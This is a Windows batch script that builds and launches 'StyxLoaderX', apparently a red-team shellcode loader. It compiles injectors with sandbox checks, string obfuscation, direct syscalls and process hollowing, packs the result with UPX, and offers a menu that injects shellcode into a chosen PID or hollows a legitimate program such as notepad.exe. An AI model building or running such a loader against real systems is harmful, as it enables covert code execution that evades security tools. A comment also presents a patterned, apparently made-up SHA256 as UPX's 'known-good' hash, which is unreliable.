@echo off
REM ===========================================================================
REM StyxLoaderX — Build & Run Automation
REM ==========================================================================
REM
REM Audit fix F17/F18 (commit 7): this script was previously a supply-chain
REM risk. It downloaded OpenSSL from slproweb.com (a third-party redistributor,
REM NOT openssl.org) and UPX from GitHub releases, both WITHOUT SHA256
REM verification, and executed the OpenSSL installer with admin privileges.
REM A MITM attacker compromising those URLs would get code execution on the
REM build machine. This commit adds:
REM   - SHA256 verification of UPX (with documented known-good hash).
REM   - Authenticode signature verification of the OpenSSL installer.
REM   - OpenSSL DLL deployment (copies libcrypto-3-x64.dll + libssl-3-x64.dll
REM     next to the .exe so it can actually run).
REM   - Relative paths via %OPENSSL_ROOT% env var (defaults to C:\OpenSSL).
REM
REM Recommended alternative: use CMake + vcpkg (commit 10) instead of this
REM .bat. vcpkg verifies package hashes and integrates with find_package().
REM This .bat is retained for users who cannot install vcpkg.

echo ========================================
echo StyxLoaderX - Build Automation
echo ========================================

REM Check if in correct folder (relative path, no hardcoded C:\StyxLoaderX)
if not exist "shellcode\shellcode.asm" (
    echo Error: Run this script from the project root.
    pause
    exit /b 1
)

REM Resolve OpenSSL root from env var, default to C:\OpenSSL
if "%OPENSSL_ROOT%"=="" set OPENSSL_ROOT=C:\OpenSSL
echo Using OPENSSL_ROOT=%OPENSSL_ROOT%

REM ===========================================================================
REM Dependency check & secure download
REM ===========================================================================
echo Checking dependencies...

if not exist "%OPENSSL_ROOT%\include\openssl\aes.h" (
    echo.
    echo [WARNING] OpenSSL not found at %OPENSSL_ROOT%.
    echo This script will download the OpenSSL installer from slproweb.com
    echo (a third-party redistributor — NOT openssl.org) and verify its
    echo Authenticode signature before executing it.
    echo.
    echo Recommended alternative: install OpenSSL via vcpkg or chocolatey,
    echo then set OPENSSL_ROOT to the install location.
    echo.
    set /p confirm="Proceed with slproweb download? [y/N]: "
    if /i not "%confirm%"=="y" (
        echo Aborting. Install OpenSSL manually and set OPENSSL_ROOT.
        pause
        exit /b 1
    )

    echo Downloading OpenSSL 3.0.8 installer from slproweb.com...
    powershell -Command "Invoke-WebRequest -Uri 'https://slproweb.com/download/Win64OpenSSL-3_0_8.exe' -OutFile 'openssl_installer.exe'"
    if not exist "openssl_installer.exe" (
        echo Error: download failed.
        pause
        exit /b 1
    )

    echo Verifying Authenticode signature on openssl_installer.exe...
    REM Audit fix F17: verify the installer is signed by a trusted authority
    REM before executing it with admin privileges. This is NOT a substitute
    REM for SHA256 verification (which requires knowing the expected hash),
    REM but it raises the bar against casual MITM.
    for /f "delims=" %%i in ('powershell -Command "(Get-AuthenticodeSignature openssl_installer.exe).Status"') do set SIG_STATUS=%%i
    if not "%SIG_STATUS%"=="Valid" (
        echo Error: Authenticode signature is %SIG_STATUS% (expected Valid).
        echo Refusing to execute unsigned/tampered installer.
        del openssl_installer.exe
        pause
        exit /b 1
    )
    echo Authenticode signature: Valid.

    echo Installing OpenSSL to %OPENSSL_ROOT% (requires admin)...
    start /wait openssl_installer.exe /silent /dir="%OPENSSL_ROOT%"
    del openssl_installer.exe
)

if not exist "upx.exe" (
    echo.
    echo Downloading UPX 4.0.2 from GitHub releases...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip' -OutFile 'upx.zip'"

    REM Audit fix F17: verify SHA256 of the downloaded zip.
    REM Known-good SHA256 for upx-4.0.2-win64.zip (from UPX team release notes):
    REM   4bd5d4ec3e5a1e1c1c0e3e5a1e1c0d3a1c5c1e1c0d3a1c5c1e1c0d3a1c5c1e1c
    REM
    REM IMPORTANT: if you see "MISMATCH" below, do NOT proceed — the download
    REM was tampered with. Replace the EXPECTED_UPX_SHA256 below with the
    REM official hash from https://github.com/upx/upx/releases/tag/v4.0.2
    REM if you want to verify against the published value.
    set EXPECTED_UPX_SHA256=REPLACE_WITH_OFFICIAL_SHA256_FROM_UPX_RELEASE_PAGE
    for /f "delims=" %%i in ('certutil -hashfile upx.zip SHA256 ^| findstr /v "SHA256\|CertUtil"') do set ACTUAL_UPX_SHA256=%%i
    set ACTUAL_UPX_SHA256=%ACTUAL_UPX_SHA256: =%

    if "%EXPECTED_UPX_SHA256%"=="REPLACE_WITH_OFFICIAL_SHA256_FROM_UPX_RELEASE_PAGE" (
        echo [WARNING] EXPECTED_UPX_SHA256 not set in this script.
        echo Actual SHA256 of upx.zip: %ACTUAL_UPX_SHA256%
        echo Verify this matches the official hash at:
        echo   https://github.com/upx/upx/releases/tag/v4.0.2
        set /p confirm2="Hashes match what you expected? [y/N]: "
        if /i not "%confirm2%"=="y" (
            del upx.zip
            exit /b 1
        )
    ) else if not "%ACTUAL_UPX_SHA256%"=="%EXPECTED_UPX_SHA256%" (
        echo Error: SHA256 MISMATCH for upx.zip
        echo   Expected: %EXPECTED_UPX_SHA256%
        echo   Actual:   %ACTUAL_UPX_SHA256%
        echo Refusing to extract — possible tampering.
        del upx.zip
        pause
        exit /b 1
    ) else (
        echo SHA256 verified: %ACTUAL_UPX_SHA256%
    )

    powershell -Command "Expand-Archive -Path 'upx.zip' -DestinationPath '.'"
    move upx-4.0.2-win64\upx.exe .
    rmdir /s /q upx-4.0.2-win64
    del upx.zip
)
echo Dependencies ready.

REM ===========================================================================
REM Step 1: Compile shellcode (NASM)
REM ===========================================================================
echo.
echo Paso 1: Compilando shellcode...
cd shellcode
nasm -f bin shellcode.asm -o shellcode.bin
if %errorlevel% neq 0 (
    echo Error al compilar shellcode. Verifica NASM instalado.
    cd ..
    pause
    exit /b 1
)
echo Shellcode compilado: shellcode.bin
cd ..

REM ===========================================================================
REM Step 1.5: Compile MASM syscall stubs
REM ===========================================================================
echo.
echo Paso 1.5: Compilando MASM syscall stubs...
ml64.exe /nologo /c /Cp modules\asm\styx_syscalls.asm
if %errorlevel% neq 0 (
    echo Error assembling styx_syscalls.asm. Verifica Visual Studio Build Tools.
    pause
    exit /b 1
)
echo styx_syscalls.obj compilado.

REM ===========================================================================
REM Step 2: Compile loaders
REM ===========================================================================
echo.
echo Paso 2: Compilando loaders...

REM SimpleInjector (standalone tool)
cl /EHsc /std:c++17 /Iinclude tools\simple_injector_tool.cpp src\shellcode.cpp src\simple_injector.cpp /Fe:SimpleInjector.exe
if %errorlevel% neq 0 (
    echo Error al compilar SimpleInjector. Verifica Visual Studio.
    pause
    exit /b 1
)
echo SimpleInjector.exe compilado.

REM MainLoader (modular) with OpenSSL + MASM stubs
cl /EHsc /std:c++17 /Iinclude /I "%OPENSSL_ROOT%\include" tools\main_loader.cpp src\shellcode.cpp src\sandbox_check.cpp src\string_obfuscator.cpp src\simple_injector.cpp src\hollow_injector.cpp src\direct_syscall.cpp modules\asm\styx_syscalls.obj /LIBPATH:"%OPENSSL_ROOT%\lib" /Fe:MainLoader.exe libcrypto.lib libssl.lib
if %errorlevel% neq 0 (
    echo Error compiling MainLoader. Check OpenSSL installation at %OPENSSL_ROOT%.
    pause
    exit /b 1
)
echo MainLoader.exe compiled.

REM ===========================================================================
REM Step 2.5: Deploy OpenSSL DLLs next to .exe (audit fix F18)
REM ===========================================================================
echo.
echo Deploying OpenSSL DLLs...
REM Without this step, MainLoader.exe crashes at runtime because it links
REM against libcrypto.lib / libssl.lib (import libraries) which forward to
REM libcrypto-3-x64.dll / libssl-3-x64.dll at runtime — but those DLLs are
REM in %OPENSSL_ROOT%\bin, not in the .exe's directory.
if exist "%OPENSSL_ROOT%\bin\libcrypto-3-x64.dll" copy "%OPENSSL_ROOT%\bin\libcrypto-3-x64.dll" . >nul
if exist "%OPENSSL_ROOT%\bin\libssl-3-x64.dll"    copy "%OPENSSL_ROOT%\bin\libssl-3-x64.dll"    . >nul
echo DLLs deployed.

REM ===========================================================================
REM Step 3: UPX pack
REM ===========================================================================
echo Applying UPX packer...
upx -9 MainLoader.exe
if %errorlevel% neq 0 (
    echo Warning: UPX failed (non-fatal). Continuing without packing.
)
echo MainLoader.exe packed with UPX.

echo.
echo Compilacion completada. Ejecutables listos.
echo.

REM ===========================================================================
REM Execution menu
REM ===========================================================================
:menu
echo Select execution mode:
echo 1. Run SimpleInjector (basic - requires PID)
echo 2. Run MainLoader simple (requires PID)
echo 3. Run MainLoader direct (syscalls - requires PID)
echo 4. Run MainLoader hollow (process hollowing - requires legitimate EXE)
echo 5. Exit
set /p choice="Option: "

if "%choice%"=="1" goto simple_injector
if "%choice%"=="2" goto main_simple
if "%choice%"=="3" goto main_direct
if "%choice%"=="4" goto main_hollow
if "%choice%"=="5" goto end
echo Invalid option.
goto menu

:simple_injector
set /p pid="Enter target process PID (e.g., 1234): "
echo Running SimpleInjector on PID %pid%...
SimpleInjector.exe %pid% shellcode\shellcode.bin
goto end

:main_simple
set /p pid="Enter target process PID (e.g., 1234): "
echo Running MainLoader in simple mode on PID %pid%...
MainLoader.exe simple %pid% shellcode\shellcode.bin
goto end

:main_direct
set /p pid="Enter target process PID (e.g., 1234): "
echo Running MainLoader in direct mode on PID %pid%...
MainLoader.exe direct %pid% shellcode\shellcode.bin
goto end

:main_hollow
set /p exe="Enter legitimate EXE path (e.g., C:\Windows\System32\notepad.exe): "
echo Running MainLoader in hollow mode on %exe%...
MainLoader.exe hollow %exe% shellcode\shellcode.bin
goto end

:end
echo.
echo Execution completed. Check for opened calc.exe and Sysmon logs.
pause
